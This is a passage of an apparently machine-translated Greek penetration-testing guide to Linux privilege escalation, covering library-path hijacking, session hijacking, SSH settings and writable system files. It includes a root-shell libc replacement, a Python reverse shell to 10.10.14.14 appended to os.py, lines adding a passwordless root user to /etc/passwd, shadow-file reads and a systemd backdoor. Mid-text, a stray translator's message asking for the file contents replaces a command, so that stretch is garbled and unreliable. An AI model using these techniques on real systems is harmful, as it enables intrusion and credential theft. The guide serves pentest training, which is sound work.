Αυτό σημαίνει ότι τα αρχεία ρυθμίσεων από `/etc/ld.so.conf.d/*.conf` θα διαβαστούν. Αυτά τα αρχεία ρυθμίσεων **δείχνουν σε άλλους φακέλους** όπου **βιβλιοθήκες** θα **αναζητηθούν**. Για παράδειγμα, το περιεχόμενο του `/etc/ld.so.conf.d/libc.conf` είναι `/usr/local/lib`. **Αυτό σημαίνει ότι το σύστημα θα αναζητήσει βιβλιοθήκες μέσα στο `/usr/local/lib`**.

Εάν για κάποιο λόγο **ένας χρήστης έχει δικαιώματα εγγραφής** σε οποιαδήποτε από τις αναφερόμενες διαδρομές: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, οποιοδήποτε αρχείο μέσα στο `/etc/ld.so.conf.d/` ή οποιονδήποτε φάκελο που αναφέρεται μέσα σε αρχεία του `/etc/ld.so.conf.d/*.conf` ενδέχεται να καταφέρει ανύψωση προνομίων.\
Δείτε **πώς να εκμεταλλευτείτε αυτήν την εσφαλμένη ρύθμιση** στην παρακάτω σελίδα:


{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
Αν αντιγράψετε τη lib στο `/var/tmp/flag15/`, θα χρησιμοποιηθεί από το πρόγραμμα σε αυτή τη θέση όπως καθορίζεται στη μεταβλητή `RPATH`.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
Στη συνέχεια δημιούργησε μια κακόβουλη βιβλιοθήκη στο `/var/tmp` με `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Δυνατότητες

Οι Linux capabilities παρέχουν ένα **υποσύνολο των διαθέσιμων προνομίων root σε μια διεργασία**. Αυτό ουσιαστικά διασπά τα προνόμια του root **σε μικρότερες και διακριτές μονάδες**. Κάθε μία από αυτές τις μονάδες μπορεί στη συνέχεια να χορηγηθεί ανεξάρτητα σε διεργασίες. Με αυτόν τον τρόπο το πλήρες σύνολο προνομίων μειώνεται, μειώνοντας τους κινδύνους εκμετάλλευσης.\
Διαβάστε την ακόλουθη σελίδα για να **μάθετε περισσότερα σχετικά με τα capabilities και πώς να τα καταχραστείτε**:


{{#ref}}
linux-capabilities.md
{{#endref}}

## Δικαιώματα καταλόγου

Σε έναν κατάλογο, το **bit για "execute"** υποδηλώνει ότι ο χρήστης μπορεί να κάνει "**cd**" στον φάκελο.\
Το **"read"** bit υποδηλώνει ότι ο χρήστης μπορεί να **list** τα **files**, και το **"write"** bit υποδηλώνει ότι ο χρήστης μπορεί να **delete** και να **create** νέα **files**.

## ACLs

Access Control Lists (ACLs) αντιπροσωπεύουν το δευτερεύον επίπεδο διακριτικών δικαιωμάτων, ικανό να **υπερισχύει των παραδοσιακών ugo/rwx permissions**. Αυτά τα δικαιώματα ενισχύουν τον έλεγχο πρόσβασης σε αρχεία ή καταλόγους επιτρέποντας ή αρνούμενα δικαιώματα σε συγκεκριμένους χρήστες που δεν είναι ιδιοκτήτες ή μέλη της ομάδας. Αυτό το επίπεδο **λεπτομέρειας εξασφαλίζει πιο ακριβή διαχείριση πρόσβασης**. Περισσότερες λεπτομέρειες μπορείτε να βρείτε [**here**](https://linuxconfig.org/how-to-manage-acls-on-linux).

**Give** user "kali" read and write permissions over a file:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Λάβετε** αρχεία με συγκεκριμένα ACLs από το σύστημα:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## Open shell sessions

Σε **old versions** μπορεί να **hijack** κάποια συνεδρία **shell** άλλου χρήστη (**root**).\
Σε **newest versions** θα μπορείτε να **connect** μόνο σε screen sessions του **your own user**. Παρ' όλα αυτά, μπορεί να βρείτε **interesting information inside the session**.

### screen sessions hijacking

**List screen sessions**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../images/image (141).png>)

**Σύνδεση σε μια συνεδρία**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux sessions hijacking

Αυτό ήταν πρόβλημα με τις **παλιές εκδόσεις του tmux**. Δεν μπόρεσα να hijack ένα tmux (v2.1) session που δημιουργήθηκε από root ως non-privileged user.

**Λίστα tmux sessions**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**Συνδέσου σε μια συνεδρία**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Check **Valentine box from HTB** for an example.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

Όλα τα SSL και SSH keys που δημιουργήθηκαν σε Debian based συστήματα (Ubuntu, Kubuntu, etc) μεταξύ Σεπτεμβρίου 2006 και 13 Μαΐου 2008 μπορεί να επηρεάστηκαν από αυτό το σφάλμα.\
Αυτό το σφάλμα προκαλείται κατά τη δημιουργία ενός νέου ssh key σε αυτά τα OS, καθώς **μόνο 32,768 παραλλαγές ήταν δυνατές**. Αυτό σημαίνει ότι όλες οι πιθανότητες μπορούν να υπολογιστούν και **έχοντας το ssh public key μπορείτε να αναζητήσετε το αντίστοιχο private key**. Μπορείτε να βρείτε τις υπολογισμένες πιθανότητες εδώ: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Interesting configuration values

- **PasswordAuthentication:** Καθορίζει εάν το password authentication επιτρέπεται. Η προεπιλογή είναι `no`.
- **PubkeyAuthentication:** Καθορίζει εάν το public key authentication επιτρέπεται. Η προεπιλογή είναι `yes`.
- **PermitEmptyPasswords**: Όταν το password authentication είναι επιτρεπτό, καθορίζει εάν ο server επιτρέπει login σε λογαριασμούς με κενές συμβολοσειρές password. Η προεπιλογή είναι `no`.

### PermitRootLogin

Καθορίζει εάν ο root μπορεί να κάνει log in χρησιμοποιώντας ssh, η προεπιλογή είναι `no`. Πιθανές τιμές:

- `yes`: root μπορεί να κάνει login χρησιμοποιώντας password και private key
- `without-password` or `prohibit-password`: root μπορεί να κάνει login μόνο με private key
- `forced-commands-only`: Root μπορεί να κάνει login μόνο χρησιμοποιώντας private key και εάν έχουν οριστεί οι options commands
- `no` : όχι

### AuthorizedKeysFile

Καθορίζει αρχεία που περιέχουν τα public keys τα οποία μπορούν να χρησιμοποιηθούν για user authentication. Μπορεί να περιέχει tokens όπως `%h`, το οποίο θα αντικατασταθεί από το home directory. **You can indicate absolute paths** (starting in `/`) or **relative paths from the user's home**. For example:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
Αυτή η διαμόρφωση θα υποδείξει ότι εάν προσπαθήσετε να συνδεθείτε με το **private** key του χρήστη "**testusername**", το ssh θα συγκρίνει το public key του κλειδιού σας με αυτά που βρίσκονται στα `/home/testusername/.ssh/authorized_keys` και `/home/testusername/access`

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding σας επιτρέπει να **use your local SSH keys instead of leaving keys** (without passphrases!) να παραμένουν στον server σας. Έτσι θα μπορείτε να **jump** μέσω ssh **to a host** και από εκεί να **jump to another** host **using** το **key** που βρίσκεται στο **initial host** σας.

Πρέπει να ρυθμίσετε αυτή την επιλογή στο `$HOME/.ssh.config` ως εξής:
```
Host example.com
ForwardAgent yes
```
Σημειώστε ότι αν το `Host` είναι `*`, κάθε φορά που ο χρήστης μεταβαίνει σε διαφορετική μηχανή, εκείνος ο host θα μπορεί να έχει πρόσβαση στα κλειδιά (κάτι που είναι πρόβλημα ασφαλείας).

Το αρχείο `/etc/ssh_config` μπορεί να **παρακάμψει** αυτές τις **επιλογές** και να επιτρέψει ή να απαγορεύσει αυτή τη ρύθμιση.\
Το αρχείο `/etc/sshd_config` μπορεί να **επιτρέψει** ή να **απορρίψει** το ssh-agent forwarding με την παράμετρο `AllowAgentForwarding` (προεπιλογή: allow).

Αν διαπιστώσετε ότι το Forward Agent είναι ρυθμισμένο σε ένα περιβάλλον, διαβάστε την παρακάτω σελίδα, καθώς **μπορεί να μπορείτε να το εκμεταλλευτείτε για κλιμάκωση προνομίων**:


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## Σημαντικά αρχεία

### Αρχεία προφίλ

Το αρχείο `/etc/profile` και τα αρχεία κάτω από το `/etc/profile.d/` είναι **scripts που εκτελούνται όταν ένας χρήστης ανοίγει ένα νέο shell**. Επομένως, αν μπορείτε να **γράψετε ή να τροποποιήσετε οποιοδήποτε από αυτά, μπορείτε να κλιμακώσετε προνόμια**.
```bash
ls -l /etc/profile /etc/profile.d/
```
Αν εντοπιστεί κάποιο περίεργο profile script πρέπει να το ελέγξετε για **ευαίσθητες λεπτομέρειες**.

### Passwd/Shadow Αρχεία

Ανάλογα με το OS τα αρχεία `/etc/passwd` και `/etc/shadow` μπορεί να χρησιμοποιούν διαφορετικό όνομα ή να υπάρχει κάποιο backup. Επομένως συνιστάται **να τα βρείτε όλα** και **να ελέγξετε αν μπορείτε να τα διαβάσετε** για να δείτε **αν υπάρχουν hashes** μέσα στα αρχεία:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
Σε ορισμένες περιπτώσεις μπορείτε να βρείτε **password hashes** μέσα στο `/etc/passwd` (ή αντίστοιχο) αρχείο
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### Εγγράψιμο /etc/passwd

Πρώτα, δημιουργήστε ένα password με μία από τις ακόλουθες εντολές.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
I don't have the contents of src/linux-hardening/privilege-escalation/README.md. Παρακαλώ επικολλήστε εδώ το περιεχόμενο του αρχείου που θέλετε να μεταφράσω — τότε θα το μεταφράσω στα Ελληνικά και θα προσθέσω την εντολή για τη δημιουργία του χρήστη `hacker` μαζί με τον παραγόμενο κωδικό.
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
Π.χ: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Μπορείτε τώρα να χρησιμοποιήσετε την εντολή `su` με `hacker:hacker`

Εναλλακτικά, μπορείτε να χρησιμοποιήσετε τις παρακάτω γραμμές για να προσθέσετε έναν dummy χρήστη χωρίς κωδικό πρόσβασης.\
ΠΡΟΕΙΔΟΠΟΙΗΣΗ: αυτό μπορεί να υποβαθμίσει την τρέχουσα ασφάλεια της μηχανής.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
ΣΗΜΕΙΩΣΗ: Στις πλατφόρμες BSD το `/etc/passwd` βρίσκεται σε `/etc/pwd.db` και `/etc/master.passwd`, επίσης το `/etc/shadow` μετονομάστηκε σε `/etc/spwd.db`.

Πρέπει να ελέγξετε αν μπορείτε να **γράψετε σε κάποια ευαίσθητα αρχεία**. Για παράδειγμα, μπορείτε να γράψετε σε κάποιο **αρχείο ρυθμίσεων υπηρεσίας**;
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Για παράδειγμα, αν το μηχάνημα τρέχει έναν **tomcat** server και μπορείτε να **modify the Tomcat service configuration file inside /etc/systemd/,** τότε μπορείτε να τροποποιήσετε τις γραμμές:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Το backdoor σας θα εκτελεστεί την επόμενη φορά που θα ξεκινήσει ο tomcat.

### Έλεγχος φακέλων

Οι παρακάτω φάκελοι ενδέχεται να περιέχουν αντίγραφα ασφαλείας ή ενδιαφέρουσες πληροφορίες: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Πιθανότατα δεν θα μπορείτε να διαβάσετε τον τελευταίο, αλλά δοκιμάστε)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Περίεργη Τοποθεσία/Owned αρχεία
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### Τροποποιημένα αρχεία τα τελευταία λεπτά
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite DB files
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml αρχεία
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### Κρυφά αρχεία
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **Script/Binaries στο PATH**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Αρχεία Web**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Αντίγραφα ασφαλείας**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Γνωστά αρχεία που περιέχουν passwords

Διαβάστε τον κώδικα του [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), αναζητά **αρκετά πιθανά αρχεία που μπορεί να περιέχουν passwords**.\
**Ένα άλλο ενδιαφέρον εργαλείο** που μπορείτε να χρησιμοποιήσετε για αυτό είναι: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) η οποία είναι μια εφαρμογή ανοιχτού κώδικα που χρησιμοποιείται για την ανάκτηση πολλών passwords αποθηκευμένων σε τοπικό υπολογιστή για Windows, Linux & Mac.

### Logs

Αν μπορείτε να διαβάσετε logs, ίσως να καταφέρετε να βρείτε **ενδιαφέρουσες/εμπιστευτικές πληροφορίες μέσα σε αυτά**. Όσο πιο περίεργος είναι ο log, τόσο πιο ενδιαφέρον θα είναι (πιθανώς).\
Επίσης, μερικά "**bad**" διαμορφωμένα (backdoored?) **audit logs** μπορεί να σας επιτρέψουν να **καταγράψετε passwords** μέσα σε audit logs όπως εξηγείται σε αυτό το άρθρο: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
Για να **διαβάσετε logs η ομάδα** [**adm**](interesting-groups-linux-pe/index.html#adm-group) θα είναι πολύ χρήσιμη.

### Shell files
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

Πρέπει επίσης να ελέγχετε για αρχεία που περιέχουν τη λέξη "**password**" είτε στο **όνομα** τους είτε μέσα στο **περιεχόμενο**, και επίσης να ελέγχετε για IPs και emails μέσα σε logs ή για hashes με regexps.\
Δεν πρόκειται να απαριθμήσω εδώ πώς να κάνετε όλα αυτά, αλλά αν σας ενδιαφέρει μπορείτε να δείτε τους τελευταίους ελέγχους που εκτελεί το [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh).

## Εγγράψιμα αρχεία

### Python library hijacking

Αν γνωρίζετε από **πού** πρόκειται να εκτελεστεί ένα python script και **μπορείτε να γράψετε** σε εκείνο το φάκελο ή μπορείτε να **modify python libraries**, μπορείτε να τροποποιήσετε τη βιβλιοθήκη OS και να την backdoor (αν μπορείτε να γράψετε εκεί όπου θα εκτελεστεί το python script, αντιγράψτε και επικολλήστε τη βιβλιοθήκη os.py).

Για να **backdoor the library** απλά πρόσθεσε στο τέλος της βιβλιοθήκης os.py την ακόλουθη γραμμή (change IP and PORT):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Εκμετάλλευση logrotate

Μια ευπάθεια στο `logrotate` επιτρέπει σε χρήστες με **write permissions** σε ένα αρχείο καταγραφής ή στους γονικούς καταλόγους του να αποκτήσουν ενδεχομένως αυξημένα προνόμια. Αυτό συμβαίνει επειδή το `logrotate`, που συχνά τρέχει ως **root**, μπορεί να χειραγωγηθεί ώστε να εκτελέσει αυθαίρετα αρχεία, ειδικά σε καταλόγους όπως _**/etc/bash_completion.d/**_. Είναι σημαντικό να ελέγχετε τα δικαιώματα όχι μόνο στο _/var/log_ αλλά και σε οποιονδήποτε κατάλογο όπου εφαρμόζεται η περιστροφή αρχείων καταγραφής.

> [!TIP]
> Αυτή η ευπάθεια επηρεάζει το `logrotate` έκδοση `3.18.0` και παλαιότερες

Περισσότερες λεπτομέρειες για την ευπάθεια μπορείτε να βρείτε σε αυτή τη σελίδα: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

Μπορείτε να εκμεταλλευτείτε αυτή την ευπάθεια με το [**logrotten**](https://github.com/whotwagner/logrotten).

Αυτή η ευπάθεια είναι πολύ παρόμοια με [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** οπότε όποτε βρείτε ότι μπορείτε να αλλάξετε logs, ελέγξτε ποιος διαχειρίζεται αυτά τα logs και αν μπορείτε να αυξήσετε προνόμια αντικαθιστώντας τα logs με symlinks.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Vulnerability reference:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

Αν, για οποιονδήποτε λόγο, ένας χρήστης μπορεί να **write** ένα `ifcf-<whatever>` script στο _/etc/sysconfig/network-scripts_ **ή** να **adjust** ένα υπάρχον, τότε το σύστημά σας είναι **pwned**.

Τα network scripts, _ifcg-eth0_ για παράδειγμα, χρησιμοποιούνται για συνδέσεις δικτύου. Μοιάζουν ακριβώς με αρχεία .INI. Ωστόσο, αυτά είναι \~sourced\~ σε Linux από το Network Manager (dispatcher.d).

Στη δική μου περίπτωση, η τιμή `NAME=` σε αυτά τα network scripts δεν χειρίζεται σωστά. Αν έχετε **white/blank space in the name the system tries to execute the part after the white/blank space**. Αυτό σημαίνει ότι **everything after the first blank space is executed as root**.

Για παράδειγμα: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Σημειώστε το κενό μεταξύ Network και /bin/id_)

### **init, init.d, systemd, and rc.d**

Ο κατάλογος `/etc/init.d` φιλοξενεί **σενάρια** για το System V init (SysVinit), το **κλασικό σύστημα διαχείρισης υπηρεσιών του Linux**. Περιλαμβάνει σενάρια για τις ενέργειες `start`, `stop`, `restart` και μερικές φορές `reload` υπηρεσιών. Αυτά μπορούν να τρέξουν άμεσα ή μέσω symbolic links που βρίσκονται στο `/etc/rc?.d/`. Εναλλακτικό μονοπάτι σε Redhat systems είναι το `/etc/rc.d/init.d`.

Από την άλλη, το `/etc/init` συνδέεται με **Upstart**, ένα νεότερο **service management** που εισήγαγε η Ubuntu, το οποίο χρησιμοποιεί αρχεία ρυθμίσεων για εργασίες διαχείρισης υπηρεσιών. Παρά τη μετάβαση σε Upstart, τα SysVinit scripts εξακολουθούν να χρησιμοποιούνται παράλληλα με τις Upstart ρυθμίσεις λόγω ενός compatibility layer στο Upstart.

Η **systemd** παρουσιάζεται ως ένας σύγχρονος initializer και service manager, προσφέροντας προχωρημένα χαρακτηριστικά όπως on-demand daemon starting, automount management και snapshots της κατάστασης του συστήματος. Οργανώνει αρχεία στο `/usr/lib/systemd/` για distribution packages και στο `/etc/systemd/system/` για αλλαγές από τον administrator, απλοποιώντας τη διαχείριση του συστήματος.

## Άλλα κόλπα

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Τα Android rooting frameworks συνήθως κάνουν hook σε ένα syscall για να εκθέσουν privileged kernel λειτουργικότητα σε έναν userspace manager. Αδύναμη authentication του manager (π.χ. signature checks βασισμένα σε FD-order ή φτωχά password schemes) μπορεί να επιτρέψει σε ένα local app να προσποιηθεί τον manager και να escalate σε root σε ήδη-rooted συσκευές. Μάθετε περισσότερα και λεπτομέρειες εκμετάλλευσης εδώ:


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## VMware Tools service discovery LPE (CWE-426) via regex-based exec (CVE-2025-41244)

Η regex-driven service discovery σε VMware Tools/Aria Operations μπορεί να εξάγει ένα binary path από command lines διεργασιών και να το εκτελέσει με -v υπό privileged context. Επιεικείς patterns (π.χ. χρήση \S) μπορεί να ταιριάξουν attacker-staged listeners σε εγγράψιμες τοποθεσίες (π.χ. /tmp/httpd), οδηγώντας σε execution ως root (CWE-426 Untrusted Search Path).

Μάθετε περισσότερα και δείτε ένα γενικευμένο pattern που εφαρμόζεται και σε άλλα discovery/monitoring stacks εδώ:

{{#ref}}
vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Προστασίες Ασφαλείας Πυρήνα

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## Περισσότερη βοήθεια

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Best tool to look for Linux local privilege escalation vectors:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumerate kernel vulns ins linux and MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## Αναφορές

- [0xdf – HTB Planning (Crontab UI privesc, zip -P creds reuse)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [0xdf – HTB Era: forged .text_sig payload for cron-executed monitor](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [NVISO – You name it, VMware elevates it (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)

{{#include ../../banners/hacktricks-training.md}}
